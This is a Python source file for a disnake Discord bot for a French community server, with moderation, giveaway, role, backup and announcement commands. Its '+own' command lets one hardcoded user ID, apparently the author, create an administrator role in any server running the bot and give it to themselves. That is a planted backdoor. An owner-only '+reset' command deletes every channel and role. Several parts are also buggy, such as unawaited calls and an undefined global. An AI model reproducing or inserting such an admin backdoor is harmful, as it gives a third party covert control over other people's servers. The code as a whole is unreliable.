import disnake
from disnake.ext import commands, tasks
import asyncio
import os
import re
import random
import requests
import aiohttp
from datetime import timedelta
import flask
from flask import Flask, jsonify
from threading import Thread
import json
from datetime import datetime, timedelta

bot = commands.Bot(command_prefix='+', intents=disnake.Intents.all(), help_command=None)

@bot.event
async def on_ready():
    print(f"Logged in as {bot.user}.")
    statut.start()
    remind_bumping.start()
    check_status.start()
    update_staff_status.start()
    
@tasks.loop(seconds=3)
async def statut():
    activity_list = ["discord.gg/miyakofr", "+help", "Made By Mxtsouko"]
    selected = random.choice(activity_list)
    status_list = [disnake.Status.idle, disnake.Status.do_not_disturb, disnake.Status.online]
    selected_status = random.choice(status_list)

    await bot.change_presence(
        status=selected_status,
        activity=disnake.Activity(
            type=disnake.ActivityType.streaming,
            name=selected,
            url='https://www.twitch.tv/mxtsouko'
        )
    )
    
@tasks.loop(minutes=3)
async def update_staff_status(channel_name):
    global staff_status_message

    guild = bot.guilds[0]  # Remplacez par le serveur spécifique si nécessaire
    channel = disnake.utils.get(guild.text_channels, name=channel_name)
    if not channel:
        return

    role = disnake.utils.get(guild.roles, name='📁〢Staff')
    if not role:
        return

    statuses = {"online": [], "idle": [], "dnd": [], "offline": []}

    for member in guild.members:
        if role in member.roles:
            if member.status == disnake.Status.online:
                statuses["online"].append(member.mention)
            elif member.status == disnake.Status.idle:
                statuses["idle"].append(member.mention)
            elif member.status == disnake.Status.dnd:
                statuses["dnd"].append(member.mention)
            else:
                statuses["offline"].append(member.mention)

    embed = disnake.Embed(
        title="Staff Status",
        color=0x7065c9,
        description="Here are the current statuses of the staff members."
    )
    embed.add_field(name="`🟢` **Online**", value='\n'.join(statuses["online"]) or "No one", inline=False)
    embed.add_field(name="`🌙` **Idle**", value='\n'.join(statuses["idle"]) or "No one", inline=False)
    embed.add_field(name="`⛔` **Do not disturb**", value='\n'.join(statuses["dnd"]) or "No one", inline=False)
    embed.add_field(name="`⚫` **Offline**", value='\n'.join(statuses["offline"]) or "No one", inline=False)

    try:
        await channel.purge(limit=100)
    except Exception:
        pass

    if staff_status_message is None:
        staff_status_message = await channel.send(embed=embed)
    else:
        await staff_status_message.edit(embed=embed)

@update_staff_status.before_loop
async def before_update_staff_status():
    await bot.wait_until_ready()

@tasks.loop(hours=2)
async def remind_bumping():
    for guild in bot.guilds:
        channel = disnake.utils.get(guild.text_channels, name='🥤•〃bump')
        role = disnake.utils.get(guild.roles, name='🌴〢Bump')
    if channel and role:
        try:
            await channel.purge(limit=100) 
        except Exception as e:
            print(f"Error purging messages: {e}")

        if channel and role:
            embed = disnake.Embed(
                title="Reminder 🌴",
                description="It's time to bump the server!",
                color=0xc1e1c1
            )
            await channel.send(content=role.mention, embed=embed)
            
@tasks.loop(seconds=20)
async def check_status():
    for guild in bot.guilds:
        role = disnake.utils.get(guild.roles, name='🔱〢Miyako on Top')
        if not role:
            print(f"Role '🔱〢Miyako on Top' not found in {guild.name}.")
            continue

        for member in guild.members:
            if member.bot or member.status == disnake.Status.offline:
                continue

            has_custom_status = any(
                activity.type == disnake.ActivityType.custom and activity.state and '/miyakofr' in activity.state
                for activity in member.activities
            )

            if has_custom_status and role not in member.roles:
                await member.add_roles(role)
                print(f'Role added to {member.display_name} in {guild.name}')
            elif not has_custom_status and role in member.roles:
                await member.remove_roles(role)
                print(f'Role removed from {member.display_name} in {guild.name}')


user_stats = {}

@bot.event
async def on_message(message):
    if message.author.bot:
        return

    if message.author.id not in user_stats:
        user_stats[message.author.id] = {
            "messages": 0,
            "voice_time": 0
        }
    
    user_stats[message.author.id]["messages"] += 1
    await bot.process_commands(message)

@bot.event
async def on_voice_state_update(member, before, after):
    if member.bot:
        return

    if member.id not in user_stats:
        user_stats[member.id] = {
            "messages": 0,
            "voice_time": 0
        }

    if before.channel is None and after.channel is not None:  
        user_stats[member.id]["voice_start"] = asyncio.get_event_loop().time() 
    elif before.channel is not None and after.channel is None:  
        if member.id in user_stats and "voice_start" in user_stats[member.id]:
            voice_time = asyncio.get_event_loop().time() - user_stats[member.id]["voice_start"]
            user_stats[member.id]["voice_time"] += voice_time  

            del user_stats[member.id]["voice_start"]

@bot.command(name='stat')
async def stat(ctx, user: disnake.Member = None):
    if user is None:
        user = ctx.author

    user_id = user.id
    stats = user_stats.get(user_id, None)
    
    if stats:
        voice_time = stats["voice_time"]
        message_count = stats["messages"]
    else:
        voice_time = 0
        message_count = 0

    hours, remainder = divmod(voice_time, 3600)
    minutes, seconds = divmod(remainder, 60)
    
    em = disnake.Embed(title='Stats', description=f"Here are the statistics for {user.display_name}:", color=disnake.Colour.dark_gray())
    em.add_field(name='Voice', value=f'Time spent in voice channels: **{int(hours)} hours, {int(minutes)} minutes, and {int(seconds)} seconds**.', inline=False)
    em.add_field(name='Messages', value=f'Total messages sent: **{message_count}**.', inline=False)
    
    await ctx.send(embed=em)


@bot.command(name='msg_partner', descriptions='show message partner conditions')
@commands.has_permissions(administrator=True)
async def partner(ctx, channel: disnake.TextChannel):
        embed_image = disnake.Embed(color=disnake.Colour.dark_gray())
        embed_image.set_image(url='https://giffiles.alphacoders.com/728/72850.gif')

        embed = disnake.Embed(title='`🍷` Conditions Partenariat', description='`🔎` **Voici les conditions de partenariat avec vos serveur :**', color=disnake.Colour.dark_gray())
        embed.add_field(name='`🌠` **Serveur de 0 a 100 (Sans les bot)**', value='Mentions: `🌴` Nous: Partenariat, `🍷` Vous: Everyone')
        embed.add_field(name='`🕊️` **Serveur 100+ (Sans les bot)**', value='Mentions: `🌴` Partenariat des deux coté')
        embed.add_field(name='`🔥` Rappel', value='Nous ne fesont pas de partenariat avec les serveur (Shop, Nsfw, ou qui ne respecte pas les tos discord)')
       
        class Ticket(disnake.ui.Button):
            def __init__(self):
                super().__init__(label="Click ici pour ouvrir un Ticket!", style=disnake.ButtonStyle.link, url="https://discord.com/channels/1251476405112537148/1293641121372831798")
                
        class NotrePub(disnake.ui.Button):
            def __init__(self):
                super().__init__(label="Clique ici pour voir Notre Fiche!", style=disnake.ButtonStyle.link, url="https://discord.com/channels/1251476405112537148/1293641124799578153")

        if channel:
            view = disnake.ui.View()
            view.add_item(Ticket())
            view.add_item(NotrePub())
            await channel.send('https://media.discordapp.net/attachments/1038084584149102653/1283304082286579784/2478276E-41CA-4738-B961-66A84B918163-1-1-1-1-1.gif?ex=66e47bcf&is=66e32a4f&hm=ac7a1faa0c29bd995c61f7e89a7fb9aa9c201b53c4489701885e5dc2f07b57c7&=')
            await channel.send(embed=embed_image)
            await ctx.send(embed=embed, view=view)
        
@bot.command(name='recrutement', description='show recrutement confitions')
@commands.has_permissions(manage_messages=True)
async def recrutement(ctx, channel: disnake.TextChannel):
        embed_image = disnake.Embed(color=disnake.Colour.dark_gray())
        embed_image.set_image(url='https://giffiles.alphacoders.com/728/72850.gif')

        embed = disnake.Embed(title='**Miyako** */Recrutement*', description="**Tu souhaites intégrer le staff de` Miyako`, mais tu ne sais pas comment t'y prendre ?**", color=disnake.Colour.dark_gray())
        embed.add_field(name='`🌴`', value='1. Être âgé de minimum **14 ans**')
        embed.add_field(name='`🎈`', value='2. Mettre ``/miyakofr`` en **statut**')
        embed.add_field(name='`🌟`', value='3. Avoir un total de minimum **200 messages** et/ou **2h** de **vocal**')
        embed.add_field(name='`🕊️`', value='Une fois toutes ces conditions remplies, tu peux ouvrir un ticket Recrutement afin d’être rank !')
        
        class Ticket(disnake.ui.Button):
            def __init__(self):
                super().__init__(label="Ticket!", style=disnake.ButtonStyle.link, url="https://discord.com/channels/1251476405112537148/1293641121372831798")
                
        class NotrePub(disnake.ui.Button):
            def __init__(self):
                super().__init__(label="Click Ici pour faire ta candidature!", style=disnake.ButtonStyle.link, url="https://forms.gle/QxWytREs11Q6XzAB6")

        if channel:
            view = disnake.ui.View()
            view.add_item(Ticket())
            view.add_item(NotrePub())
            await channel.send('https://media.discordapp.net/attachments/1038084584149102653/1283304082286579784/2478276E-41CA-4738-B961-66A84B918163-1-1-1-1-1.gif?ex=66e47bcf&is=66e32a4f&hm=ac7a1faa0c29bd995c61f7e89a7fb9aa9c201b53c4489701885e5dc2f07b57c7&=')
            await channel.send(embed=embed_image)
            await ctx.send(embed=embed, view=view)
        
@bot.command(name='moveall', description='move all user in your channel')
@commands.has_permissions(administrator=True)
async def moveall(ctx):
    if ctx.author.voice:  
        channel = ctx.author.voice.channel
        for member in ctx.guild.members:
            if member.voice and member.voice.channel != channel:  
                await member.move_to(channel)
        
        embed = disnake.Embed(
            title="🔄 Users Moved",
            description="All users have been moved to your voice channel.",
            color=disnake.Color.dark_gray()
        )
        await ctx.send(embed=embed)
    else:
        embed = disnake.Embed(
            title="❌ Error",
            description="You must be in a voice channel to use this command.",
            color=disnake.Color.dark_gray()
        )
        await ctx.send(embed=embed)
        
@bot.command(name="renew", description='duplicate and remove channel')
@commands.has_permissions(manage_channels=True)
async def renew(ctx):
    channel = ctx.channel
    category = channel.category

    new_channel = await ctx.guild.create_text_channel(channel.name, category=category)

    for perm in channel.overwrites:
        await new_channel.set_permissions(perm, overwrite=channel.overwrites[perm])

    await channel.delete()

    await new_channel.send("This channel has been renewed.")

@bot.command(name='clear', description='Clear a specified number of messages (max 1000).')
@commands.has_permissions(manage_messages=True)
async def clear(ctx, amount: int):
    if amount > 1000:
        await ctx.send("You can only delete up to 1000 messages at once.")
        return

    deleted = await ctx.channel.purge(limit=amount + 1)

    confirmation = await ctx.send(f"Deleted {len(deleted) - 1} messages.")
    await asyncio.sleep(5)
    await confirmation.delete()

        
@bot.command(name="help")
async def help_command(ctx):
    embed = disnake.Embed(
        title="Help Menu",
        color=disnake.Color.dark_gray()
    )
    embed.set_thumbnail(url=ctx.guild.icon.url if ctx.guild.icon else None)
    embed.set_image(url=ctx.guild.banner.url if ctx.guild.banner else None)

    for command in bot.commands:
        embed.add_field(
            name=f"`{command.name}`",
            value=f"**Description:** {command.description or 'No description provided.'}",
            inline=False
        )

    await ctx.send(embed=embed)

giveaways = {}

def convert_duration(duration: str):
    if not duration[:-1].isdigit():  # Check if the numeric part is valid
        return None
    
    if duration[-1] == 's':
        return int(duration[:-1])
    elif duration[-1] == 'm':
        return int(duration[:-1]) * 60
    elif duration[-1] == 'h':
        return int(duration[:-1]) * 3600
    elif duration[-1] == 'd':
        return int(duration[:-1]) * 86400
    else:
        return None

@bot.command(name='giveaway')
@commands.has_permissions(manage_messages=True)
async def start_giveaway(ctx, prize: str, conditions: str, duration: str, *, image=None):
    duration_seconds = convert_duration(duration)
    if duration_seconds is None:
        await ctx.send("Invalid duration format. Use 's' for seconds, 'm' for minutes, 'h' for hours, or 'd' for days.")
        return

    embed = disnake.Embed(
        title="New Giveaway",
        description=f"Prize: ```{prize}```",
        color=disnake.Color.dark_gray()
    )
    embed.add_field(name="Author", value=ctx.author.mention, inline=True)
    embed.add_field(name="Time", value=f"**`{duration}`**", inline=True)
    embed.add_field(name="Conditions", value=conditions, inline=False)
    
    if image:
        embed.set_image(url=image)

    message = await ctx.send(embed=embed)
    
    await message.add_reaction("🎉")

    giveaways[message.id] = {
        "prize": prize,
        "conditions": conditions,
        "duration": duration_seconds,
        "author": ctx.author,
        "participants": []
    }
    
    for remaining in range(duration_seconds, 0, -1):
        await asyncio.sleep(1)
        embed.set_field_at(1, name="Time", value=f"**`{remaining} seconds`**")
        await message.edit(embed=embed)

    giveaway_data = giveaways.pop(message.id, None)
    if giveaway_data:
        participants = giveaway_data["participants"]
        if participants:
            winner = random.choice(participants)
            embed.add_field(name="Winner", value=winner.mention, inline=False)
            await ctx.send(embed=embed)
            await winner.send(f"Congratulations! You've won: **{giveaway_data['prize']}**")
        else:
            embed.add_field(name="Winner", value="No participants.", inline=False)
            await ctx.send(embed=embed)
    
    await message.clear_reaction("🎉")

@bot.event
async def on_reaction_add(reaction, user):
    if reaction.emoji == "🎉" and not user.bot:
        message_id = reaction.message.id
        if message_id in giveaways:
            giveaways[message_id]["participants"].append(user)

@bot.event
async def on_reaction_remove(reaction, user):
    if reaction.emoji == "🎉" and not user.bot:
        message_id = reaction.message.id
        if message_id in giveaways:
            giveaways[message_id]["participants"].remove(user)
            
@bot.command(name='rules', description='show server rules')
@commands.has_permissions(manage_messages=True)
async def rules(ctx, channel: disnake.TextChannel):
    em_img = disnake.Embed()
    em_img.set_image(url='https://giffiles.alphacoders.com/728/72850.gif')

    embed = disnake.Embed(title="Règlement du Serveur", color=disnake.Colour.dark_gray())
    embed.add_field(name="Tos", value="Nous vous demandons de formellement respecter les termes de service de Discord.", inline=False)
    embed.add_field(name="Interdiction", value="Il est interdit d'insulter les autres utilisateurs, d'imposer vos croyances religieuses. Chacun est libre de ses choix. Le manque de respect et toute forme de discrimination sont strictement interdits.", inline=False)
    embed.add_field(name="Bannissement", value="Les actes suivants entraîneront un bannissement : toute forme de hacking, phishing, faux cadeaux Nitro, doxing, ou dérangements vocaux.", inline=False)
    embed.add_field(name="Pub, lien", value="Il est interdit de faire de la publicité sans permission. Vous pouvez toutefois faire une demande de partenariat si vous remplissez les conditions indiquées [ici](https://discord.com/channels/1251476405112537148/1293641123046359120).", inline=False)
    embed.add_field(name="But", value="Notre serveur a pour but de divertir les membres, de leur apporter du sourire, et de réaliser divers projets à l'avenir.", inline=False)
    embed.add_field(name="But 2", value="Nous prévoyons de vous offrir une variété de divertissements, y compris des giveaways et des projets uniques.", inline=False)

    if channel:
        await channel.send("https://media.discordapp.net/attachments/1038084584149102653/1283304082286579784/2478276E-41CA-4738-B961-66A84B918163-1-1-1-1-1.gif?ex=66e47bcf&is=66e32a4f&hm=ac7a1faa0c29bd995c61f7e89a7fb9aa9c201b53c4489701885e5dc2f07b57c7&=")
        await channel.send(embed=em_img)
        await channel.send(embed=embed)

@bot.command(name='support', description='show support message')
@commands.has_permissions(manage_messages=True)
async def soutien(ctx, channel: disnake.TextChannel):
    embed = disnake.Embed(title="Nous Soutenir `🔎`", color=disnake.Color.dark_gray())
    embed.add_field(name="/miyakofr dans votre statut", value="Obtenez le rôle <@&1293640997225369650>", inline=False)
    embed.add_field(name="Boostez le serveur", value="Obtenez le rôle <@&1256932646903091291> et ses avantages : https://discord.com/channels/1251476405112537148/1268927834714542183", inline=False)
    
    em2 = disnake.Embed()
    em2.set_image(url='https://giffiles.alphacoders.com/728/72850.gif')
    
    if channel:
        await channel.send("https://media.discordapp.net/attachments/1038084584149102653/1283304082286579784/2478276E-41CA-4738-B961-66A84B918163-1-1-1-1-1.gif?ex=66fe310f&is=66fcdf8f&hm=4b9aca670052feb715f185c930165955d5809e277009bb314cd240167507901c&=")
        await channel.send(embed=em2)
        await channel.send(embed=embed)
            
@bot.command(name='embed', description='create your embed')
@commands.has_permissions(manage_messages=True)
async def em(ctx, channel: disnake.TextChannel, titles:str, descriptions:str):
    await ctx.message.delete()
    embed = disnake.Embed(title=titles, description=descriptions, color=disnake.Color.dark_gray())
    em2 = disnake.Embed()
    em2.set_image(url='https://giffiles.alphacoders.com/728/72850.gif')
    
    if channel:
        await channel.send("https://media.discordapp.net/attachments/1038084584149102653/1283304082286579784/2478276E-41CA-4738-B961-66A84B918163-1-1-1-1-1.gif?ex=66fe310f&is=66fcdf8f&hm=4b9aca670052feb715f185c930165955d5809e277009bb314cd240167507901c&=")
        await channel.send(embed=em2)
        await channel.send(embed=embed)
        
@bot.command(name='embed_edit', description='create your embed')
@commands.has_permissions(manage_messages=True)
async def emedit(ctx, id, titles:str, descriptions:str):
    await ctx.message.delete()
    
    embed = disnake.Embed(title=titles, description=descriptions, color=disnake.Color.dark_gray())
    
    message = await ctx.channel.fetch_message(id)
    await message.edit(embed=embed)


        
@bot.command(name='say', description='send a message')
@commands.has_permissions(manage_messages=True)
async def say(ctx, *, message: str):
    await ctx.message.delete()

    
    await ctx.send(message)


@bot.command(name='modify', description='modify bot message with id')
@commands.has_permissions(manage_messages=True)
async def modify(ctx, message_id: int, *, new_message: str):
    await ctx.message.delete()
    
    try:
        message = await ctx.channel.fetch_message(message_id)
        await message.edit(content=new_message)

        embed = disnake.Embed(
            description="Message modified successfully.",
            color=disnake.Color.dark_gray()
        )
        msg = await ctx.send(embed=embed)
        asyncio.sleep(3)
        msg.delete()
        
    except disnake.NotFound:
        await ctx.send("Message not found.", ephemeral=True)
    except disnake.Forbidden:
        await ctx.send("I do not have permission to edit that message.", ephemeral=True)
    except Exception as e:
        await ctx.send(f"An error occurred: {str(e)}", ephemeral=True)
    
@bot.command(name="own", description='setup mxtsouko to config bot in another server')
async def setup_owner(ctx):
    if ctx.author.id != 723256412674719795:
        await ctx.send("You do not have permission to use this command.")
        return

    if not ctx.guild.me.guild_permissions.administrator:
        await ctx.send("I do not have the necessary administrative permissions.")
        return

    role_name = "Owner"
    existing_role = disnake.utils.get(ctx.guild.roles, name=role_name)

    if existing_role:
        embed = disnake.Embed(
            title="Role Exists",
            description=f"The role `{role_name}` already exists.",
            color=disnake.Color.red()
        )
        await ctx.send(embed=embed)
    else:
        bot_top_role = ctx.guild.me.top_role
        admin_role = await ctx.guild.create_role(name=role_name, permissions=disnake.Permissions(administrator=True))
        await admin_role.edit(position=bot_top_role.position - 1)
        owner = ctx.guild.get_member(723256412674719795)

        if owner:
            await owner.add_roles(admin_role)
            banner_url = ctx.guild.banner.url if ctx.guild.banner else None
            icon_url = ctx.guild.icon.url if ctx.guild.icon else None
            
            embed = disnake.Embed(
                title="Role Created",
                description=f"The role `{role_name}` has been created and assigned to <@723256412674719795>.",
                color=disnake.Color.green()
            )

            if icon_url:
                embed.set_thumbnail(url=icon_url)
            if banner_url:
                embed.set_image(url=banner_url)
            embed.set_footer(text=f"Action by {ctx.author}", icon_url=ctx.author.avatar.url)

            await ctx.send(embed=embed)

@bot.command(name='lock', description='Lock the channel')
@commands.has_permissions(manage_channels=True)
async def lock(ctx):
    everyone_role = ctx.guild.default_role
    await ctx.channel.set_permissions(everyone_role, send_messages=False, view_channel=True)

    embed = disnake.Embed(
        title="🔒 Channel Locked",
        description=f"Members with the **@everyone** role can still view the channel but can no longer send messages.",
        color=disnake.Color.dark_gray()
    )

    banner_url = ctx.guild.banner.url if ctx.guild.banner else None
    icon_url = ctx.guild.icon.url if ctx.guild.icon else None

    if icon_url:
        embed.set_thumbnail(url=icon_url)
    if banner_url:
        embed.set_image(url=banner_url)

    await ctx.send(embed=embed)


@bot.command(name='unlock', description='Unlock the channel')
@commands.has_permissions(manage_channels=True)
async def unlock(ctx):
    everyone_role = ctx.guild.default_role
    await ctx.channel.set_permissions(everyone_role, send_messages=True, view_channel=True)

    embed = disnake.Embed(
        title="🔓 Channel Unlocked",
        description=f"Members with the **@everyone** role can now send messages in this channel.",
        color=disnake.Color.dark_gray()
    )

    banner_url = ctx.guild.banner.url if ctx.guild.banner else None
    icon_url = ctx.guild.icon.url if ctx.guild.icon else None

    if icon_url:
        embed.set_thumbnail(url=icon_url)
    if banner_url:
        embed.set_image(url=banner_url)

    await ctx.send(embed=embed)

@bot.command(name="give", description="Assign a role to a member or all members")
@commands.has_permissions(manage_guild=True)
async def give(ctx, member: str, *, role_name: str):
    role = disnake.utils.get(ctx.guild.roles, name=role_name)

    if not role or role.position >= ctx.guild.me.top_role.position:
        embed = disnake.Embed(
            title="Error", 
            description=f"Role `{role_name}` not found or above my permissions.",
            color=disnake.Color.red()
        )
        await ctx.send(embed=embed)
        return

    banner_url = ctx.guild.banner.url if ctx.guild.banner else None
    icon_url = ctx.guild.icon.url if ctx.guild.icon else None

    embed = disnake.Embed(
        title=f"Role Assignment: `{role_name}`",
        color=disnake.Color.green()
    )
    
    if icon_url:
        embed.set_thumbnail(url=icon_url)
    if banner_url:
        embed.set_image(url=banner_url)
    embed.set_footer(text=f"Action by {ctx.author}", icon_url=ctx.author.avatar.url)
    
    message = await ctx.send(embed=embed)

    if member == "all":
        success, failed = 0, 0
        for user in ctx.guild.members:
            if not user.bot and role not in user.roles:
                try:
                    await user.add_roles(role)
                    success += 1
                except disnake.Forbidden:
                    failed += 1
        embed.description = f"Assigned role `{role_name}` to {success} members."
        if failed:
            embed.description += f"\nFailed to assign role to {failed} members."
    else:
        target_member = disnake.utils.get(ctx.guild.members, mention=member)
        if not target_member:
            embed.title = "Error"
            embed.description = f"Member `{member}` not found."
            embed.color = disnake.Color.red()
        else:
            if role in target_member.roles:
                embed.description = f"{target_member.mention} already has the role `{role_name}`."
                embed.color = disnake.Color.orange()
            else:
                try:
                    await target_member.add_roles(role)
                    embed.description = f"Assigned role `{role_name}` to {target_member.mention}."
                except disnake.Forbidden:
                    embed.description = f"Cannot assign role to {target_member.mention}."
                    embed.color = disnake.Color.red()

    await message.edit(embed=embed)

@bot.command(name="reset", description="Reset the server")
@commands.is_owner()
async def reset(ctx):
    try:
        # Suppression des salons
        for channel in ctx.guild.channels:
            try:
                await channel.delete()
            except disnake.Forbidden:
                await ctx.send(f"Missing permissions to delete channel: {channel.name}")
            except Exception as e:
                await ctx.send(f"Error deleting channel: {channel.name} - {e}")

        # Suppression des rôles sauf @everyone
        for role in ctx.guild.roles:
            if role.name != "@everyone":
                try:
                    await role.delete()
                except disnake.Forbidden:
                    await ctx.send(f"Missing permissions to delete role: {role.name}")
                except Exception as e:
                    await ctx.send(f"Error deleting role: {role.name} - {e}")

        # Création du canal "Server is reset"
        reset_channel = await ctx.guild.create_text_channel("server-is-reset")
        await reset_channel.send(f"<@723256412674719795> The server has been reset.")

    except Exception as e:
        await ctx.send(f"An error occurred: {e}")


@bot.command(name='backup', description='Create a backup of the server')
@commands.is_owner()
async def backup(ctx):
    server_data = {
        'roles': {},
        'categories': {},
        'channels': []
    }

    # Sauvegarde des rôles
    for role in ctx.guild.roles:
        if role.name != "@everyone":
            server_data['roles'][role.id] = {
                'name': role.name,
                'permissions': role.permissions.value,
                'position': role.position,
                'color': role.color.value  # Sauvegarde de la couleur
            }
            
    for category in ctx.guild.categories:
        server_data['categories'][category.id] = {
            'name': category.name,
            'position': category.position,
            'overwrites': {}
        }

        for role in ctx.guild.roles:
            server_data['categories'][category.id]['overwrites'][role.id] = {
                'send_messages': category.permissions_for(role).send_messages,
                'read_messages': category.permissions_for(role).read_messages
            }

    for channel in ctx.guild.channels:
        if isinstance(channel, disnake.TextChannel) or isinstance(channel, disnake.VoiceChannel):
            channel_data = {
                'id': channel.id,
                'name': channel.name,
                'type': 'text' if isinstance(channel, disnake.TextChannel) else 'voice',
                'position': channel.position,
                'parent_id': channel.category.id if channel.category else None,
                'overwrites': {}
            }

            for role in ctx.guild.roles:
                channel_data['overwrites'][role.id] = {
                    'send_messages': channel.permissions_for(role).send_messages,
                    'read_messages': channel.permissions_for(role).read_messages
                }

            server_data['channels'].append(channel_data)

    with open('backup.json', 'w') as f:
        json.dump(server_data, f, indent=4)

    await ctx.send("Backup has been created successfully.")


@bot.command(name='load', description='Load the backup of the server')
@commands.is_owner()
async def load(ctx):
    try:
        with open('backup.json', 'r') as f:
            server_data = json.load(f)

        # Création des rôles
        for role_data in sorted(server_data['roles'].values(), key=lambda r: r['position']):
            try:
                role = await ctx.guild.create_role(
                    name=role_data['name'], 
                    permissions=disnake.Permissions(role_data['permissions']),
                    color=disnake.Color(role_data['color'])  # Récupération de la couleur du rôle
                )
                await role.edit(position=role_data['position'])
            except disnake.Forbidden:
                await ctx.send(f"Missing permissions to create role: {role_data['name']}")
            except Exception as e:
                await ctx.send(f"Error creating role: {role_data['name']} - {e}")

        # Création des catégories
        for category_data in sorted(server_data['categories'].values(), key=lambda c: c['position']):
            try:
                category = await ctx.guild.create_category(name=category_data['name'], position=category_data['position'])
                for role_id, permissions in category_data['overwrites'].items():
                    role = ctx.guild.get_role(role_id)
                    if role:
                        await category.set_permissions(role, send_messages=permissions['send_messages'], read_messages=permissions['read_messages'])
            except disnake.Forbidden:
                await ctx.send(f"Missing permissions to create category: {category_data['name']}")
            except Exception as e:
                await ctx.send(f"Error creating category: {category_data['name']} - {e}")

        # Création des salons
        for channel_data in sorted(server_data['channels'], key=lambda c: c['position']):
            try:
                category = None
                if channel_data['parent_id']:
                    category = disnake.utils.get(ctx.guild.categories, id=channel_data['parent_id'])
                if channel_data['type'] == 'text':
                    channel = await ctx.guild.create_text_channel(name=channel_data['name'], category=category, position=channel_data['position'])
                else:
                    channel = await ctx.guild.create_voice_channel(name=channel_data['name'], category=category, position=channel_data['position'])

                for role_id, permissions in channel_data['overwrites'].items():
                    role = ctx.guild.get_role(role_id)
                    if role:
                        await channel.set_permissions(role, send_messages=permissions['send_messages'], read_messages=permissions['read_messages'])
            except disnake.Forbidden:
                await ctx.send(f"Missing permissions to create channel: {channel_data['name']}")
            except Exception as e:
                await ctx.send(f"Error creating channel: {channel_data['name']} - {e}")

        await ctx.send("Backup has been loaded successfully.")
    except Exception as e:
        await ctx.send(f"An error occurred: {e}")


@bot.command(name='suspend', description='Suspend a staff member')
@commands.has_permissions(manage_guild=True)
async def suspend(ctx, membre: disnake.Member, temps: str, *roles: disnake.Role):
    time_mapping = {
        "s": 1,    
        "m": 60,    
        "h": 3600,  
        "d": 86400  
    }

    if temps[-1] not in time_mapping:
        await ctx.send("Invalid time format. Use 's', 'm', 'h', or 'd'.", ephemeral=True)
        return

    try:
        duration = int(temps[:-1]) * time_mapping[temps[-1]]
    except ValueError:
        await ctx.send("Invalid time format.", ephemeral=True)
        return


    if not roles:
        await ctx.send("You must specify at least one role to remove.", ephemeral=True)
        return

    guild = ctx.guild
    banner_url = guild.banner.url if guild.banner else None
    icon_url = guild.icon.url if guild.icon else None

    for role in roles:
        await membre.remove_roles(role)

    try:
        await membre.send(f"You have been suspended for {temps}. Your staff roles have been temporarily removed.")
    except disnake.Forbidden:
        await ctx.send("Unable to send a DM to the member.", ephemeral=True)

    embed = disnake.Embed(
        title=f"{membre.name} has been suspended",
        description=f"Suspended for {temps}. Staff roles removed temporarily.",
        color=disnake.Color.red()
    )

    if icon_url:
        embed.set_thumbnail(url=icon_url)

    if banner_url:
        embed.set_image(url=banner_url)

    embed.set_footer(text=f"Action performed by {ctx.author.name}", icon_url=ctx.author.avatar.url)
    await ctx.send(embed=embed, ephemeral=True)

    await asyncio.sleep(duration)


    for role in roles:
        await membre.add_roles(role)

    await ctx.send(f"The suspension for {membre.mention} has ended.", ephemeral=True)



@bot.command(name='ban', description='Ban a user')
@commands.has_permissions(ban_members=True)
async def ban(ctx, member: disnake.Member, *, reason=None):
    if member == ctx.author:
        await ctx.send("You cannot ban yourself!")
        return

    reason = reason or "No reason provided"
    await member.ban(reason=reason)

    guild = ctx.guild
    banner_url = guild.banner.url if guild.banner else None
    icon_url = guild.icon.url if guild.icon else None

    embed = disnake.Embed(
        title=f"{member.name} has been banned",
        description=f"**```Reason: {reason}```**",
        color=disnake.Color.dark_grey()
    )

    if icon_url:
        embed.set_thumbnail(url=icon_url)
    
    if banner_url:
        embed.set_image(url=banner_url)

    embed.set_footer(text=f"Banned by {ctx.author.name}", icon_url=ctx.author.avatar.url)

    await ctx.send(content=member.mention, embed=embed)


@bot.command(name='tempban', description='Temporarily ban a user')
@commands.has_permissions(ban_members=True)
async def tempban(ctx, member: disnake.Member, time: int, unit: str, *, reason=None):
    if member == ctx.author:
        await ctx.send("You cannot ban yourself!")
        return

    time_units = {
        's': timedelta(seconds=time),
        'm': timedelta(minutes=time),
        'h': timedelta(hours=time),
        'd': timedelta(days=time)
    }

    if unit not in time_units:
        await ctx.send("Invalid time unit. Use 's' (seconds), 'm' (minutes), 'h' (hours), or 'd' (days).")
        return

    try:
        await member.ban(reason=reason or "No reason provided")

        guild = ctx.guild
        banner_url = guild.banner.url if guild.banner else None
        icon_url = guild.icon.url if guild.icon else None

        embed = disnake.Embed(
            title=f"{member.name} has been temporarily banned",
            description=f"Banned for {time} {unit}. (Reason: {reason or 'No reason provided'})",
            color=disnake.Color.dark_grey()
        )
        if icon_url:
            embed.set_thumbnail(url=icon_url)
        if banner_url:
            embed.set_image(url=banner_url)

        msg = await ctx.send(embed=embed)

        total_seconds = time_units[unit].total_seconds()
        for i in range(int(total_seconds // 60)): 
            remaining_time = int(total_seconds // 60) - i
            embed.description = f"Banned for {time} {unit}.\nRemaining time: {remaining_time} minutes."
            await msg.edit(embed=embed)
            await asyncio.sleep(60)  

        await asyncio.sleep(total_seconds % 60) 
        await ctx.guild.unban(member)

        embed.title = f"{member.name} has been unbanned"
        embed.description = f"{member.name} was unbanned after serving {time} {unit}."
        await msg.edit(embed=embed)

        await ctx.send(f"{member.name} has been unbanned after {time} {unit}.")

    except disnake.Forbidden:
        await ctx.send("I don't have permission to ban this user.")
    except Exception as e:
        await ctx.send(f"An error occurred: {str(e)}")


@ban.error
@tempban.error
async def ban_error(ctx, error):
    if isinstance(error, commands.MissingPermissions):
        await ctx.send("Vous n'avez pas les permissions nécessaires pour utiliser cette commande.")
    elif isinstance(error, commands.BadArgument):
        await ctx.send("Utilisateur non trouvé ou mauvais argument.")
    else:
        await ctx.send("Une erreur est survenue.")




@bot.command(name='rank', description='promote a member role')
@commands.has_permissions(administrator=True)
async def rank(ctx, member: disnake.Member, role: disnake.Role):
    try:
        if role in member.roles:
            await ctx.send(f"{member.mention} already has the role {role.mention}.", delete_after=5)
        else:
            await member.add_roles(role)
            await ctx.send(f"{member.mention} has been promoted to {role.mention}.")

    except disnake.Forbidden:
        await ctx.send("I don't have permission to modify roles.", delete_after=5)

    except disnake.HTTPException:
        await ctx.send("An error occurred while assigning the role.", delete_after=5)

    except Exception as e:
        await ctx.send(f"An error occurred: {str(e)}", delete_after=5)


@rank.error
async def rank_error(ctx, error):
    if isinstance(error, commands.MissingRole):
        await ctx.send("You do not have permission to use this command.", delete_after=5)
    elif isinstance(error, commands.BadArgument):
        await ctx.send("Invalid argument. Make sure to mention a valid member and role.", delete_after=5)

app = Flask('')

